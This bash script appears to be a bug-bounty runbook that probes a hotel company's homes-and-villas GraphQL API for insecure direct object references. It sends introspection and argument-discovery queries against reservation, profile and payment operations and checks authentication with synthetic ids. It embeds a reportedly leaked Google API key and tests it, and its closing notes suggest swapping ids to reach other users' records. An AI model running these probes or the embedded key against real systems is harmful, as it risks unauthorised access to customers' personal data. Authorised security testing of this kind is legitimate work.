#!/usr/bin/env bash
# =============================================================================
# Marriott — homes-and-villas GraphQL API IDOR probe (session37)
# Portable: Linux / Pi / Termux.
#
# s36 found HnV exposes GraphQL at /graphql + /gateway/graphql with 30 ops incl.
# reservationDetails, getTotalReservationData, getProfileDetails, freedomPayDetails,
# getOTP, validateMFA. HnV has 17 prior IDOR reports. This probes the API:
#   A. Reach the endpoint (prime Akamai cookies, POST a trivial query)
#   B. Introspection (full schema if enabled)
#   C. Error-oracle the high-value ops to learn required args (reservation id,
#      profile id) WITHOUT supplying real victim data
#   D. Auth model: does a reservation/profile query need a session, or return
#      data / a weak OTP-gated path unauthenticated?
#   E. Quick check whether the leaked Google API key is referer-restricted
#
# SAFETY: in-scope. Read-only queries only — NO mutations (doBook, cancel,
# updateSecondPayment, sendEmail are NOT sent). Use only synthetic/own IDs. STOP
# on any real third-party PII; document own/synthetic. X-Bug-Bounty header.
#
# Run (Termux): OUTDIR=$HOME/s37 bash runbooks/PI-RUNBOOK-session37-hnv-graphql.sh \
#                 2>&1 | tee $HOME/s37/s37.log
# =============================================================================
set -eo pipefail

if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/s37
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/s37"
  else OUTDIR="$HOME/s37"; fi
fi
export OUTDIR
mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
IDH='X-Bug-Bounty: hackerone-researcher'
T="homes-and-villas.marriott.com"; B="https://$T"
JAR="$OUTDIR/cookies.txt"

echo "============================================================"
echo "HNV GRAPHQL PROBE  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "IP: $(curl -s ifconfig.me)   Work: $OUTDIR"
echo "============================================================"
echo ""

# Prime Akamai bot cookies from the SPA so POSTs aren't bot-blocked
curl -s -o /dev/null -c "$JAR" -H "User-Agent: $UA" -H "$IDH" --max-time 20 "$B/" || true

gql() { # endpoint json-query tag
  local ep="$1" q="$2" tag="$3"
  curl -s -o "$OUTDIR/$tag.txt" -D "$OUTDIR/$tag.hdr" -b "$JAR" -c "$JAR" \
    -H "User-Agent: $UA" -H "$IDH" \
    -H 'Content-Type: application/json' -H 'Accept: application/json' \
    -H "Origin: $B" -H "Referer: $B/" \
    --max-time 20 --data "$q" \
    -w '%{http_code}|%{size_download}' "$B$ep" 2>/dev/null || echo "000|0"
}

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: ENDPOINT REACHABILITY ═══"
for EP in /graphql /gateway/graphql; do
  m=$(gql "$EP" '{"query":"{__typename}"}' "a$(echo "$EP"|tr -c A-Za-z0-9 _)")
  echo "  POST $EP {__typename} -> ${m%|*} | ${m#*|}B"
  echo "    body: $(head -c 220 "$OUTDIR/a$(echo "$EP"|tr -c A-Za-z0-9 _).txt" | tr '\n' ' ')"
done
echo ""
# pick the endpoint that responded with GraphQL JSON
EP="/graphql"
grep -q '"data"\|"errors"' "$OUTDIR/a_graphql.txt" 2>/dev/null || EP="/gateway/graphql"
echo "  using endpoint: $EP"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: INTROSPECTION ═══"
m=$(gql "$EP" '{"query":"query{__schema{queryType{name} mutationType{name} types{name kind}}}"}' b-introspect)
echo "  introspection -> ${m%|*} | ${m#*|}B"
if grep -q '"types"' "$OUTDIR/b-introspect.txt" 2>/dev/null; then
  echo "  *** INTROSPECTION ENABLED — schema dump:"
  python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]
try:
    d=json.load(open(f"{O}/b-introspect.txt"))
    types=d["data"]["__schema"]["types"]
    names=[t["name"] for t in types if not t["name"].startswith("__")]
    print("    types:",len(names))
    for n in names[:60]: print("      ",n)
    open(f"{O}/types.txt","w").write("\n".join(names))
except Exception as e:
    print("    parse err:",e)
PYEOF
else
  echo "  introspection disabled or blocked: $(head -c 160 "$OUTDIR/b-introspect.txt" | tr '\n' ' ')"
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: ERROR-ORACLE HIGH-VALUE OPS (learn args, no victim data) ═══"
# Send each op with NO args -> GraphQL replies with the required-argument names.
for OP in reservationDetails getTotalReservationData getProfileDetails \
          freedomPayDetails properties propertyDetails; do
  m=$(gql "$EP" "{\"query\":\"query{${OP}{__typename}}\"}" "c-$OP")
  code="${m%|*}"; size="${m#*|}"
  printf '  %-26s [%s %sB] %s\n' "$OP" "$code" "$size" "$(head -c 200 "$OUTDIR/c-$OP.txt" | tr '\n' ' ')"
  sleep 0.4
done
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE D: AUTH MODEL on a reservation lookup (synthetic id) ═══"
# Use an obviously-synthetic reservation id. We are NOT looking up a real guest;
# we only want to see whether the API requires auth (401/forbidden) or returns
# data / a not-found for an arbitrary id (the IDOR tell).
for VAR in '{"id":"00000000"}' '{"reservationId":"00000000"}' '{"confirmationNumber":"00000000"}'; do
  m=$(gql "$EP" "{\"query\":\"query R(\$id:String){reservationDetails(id:\$id){__typename}}\",\"variables\":$VAR}" "d-$(echo "$VAR"|tr -c A-Za-z0-9 _)")
  echo "  vars=$VAR -> ${m%|*} | ${m#*|}B"
  echo "    $(head -c 220 "$OUTDIR/d-$(echo "$VAR"|tr -c A-Za-z0-9 _).txt" | tr '\n' ' ')"
  sleep 0.4
done
echo ""

# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE E: GOOGLE API KEY RESTRICTION CHECK ═══"
KEY="AIzaSyB9kXLfwDKiaQSi_mpxA5EAcu0NPBJKUb4"
echo "  testing if key is referer-restricted (Geocoding, no referer):"
gc=$(curl -s --max-time 15 -o "$OUTDIR/gkey.txt" -w '%{http_code}' \
  "https://maps.googleapis.com/maps/api/geocode/json?address=NYC&key=$KEY" 2>/dev/null || echo 000)
echo "  HTTP $gc :: $(head -c 200 "$OUTDIR/gkey.txt" | tr '\n' ' ')"
echo "  (status=OK with no referer => UNRESTRICTED key = billable-API abuse finding;"
echo "   REQUEST_DENIED/referer error => restricted = informational)"
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT / NEXT"
echo "════════════════════════════════════════════"
echo "  - Introspection ON  -> full schema; map every id-bearing query for IDOR."
echo "  - Op returns data unauth for synthetic id -> UNAUTH data access (test real"
echo "    cross-user carefully, own/synthetic only)."
echo "  - Op = 401/forbidden -> capture an authenticated HnV session next, then"
echo "    swap your own reservation/profile id for an adjacent one (cross-tenant)."
echo "  - Google key OK unauth -> separate finding (validate billable API enabled)."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
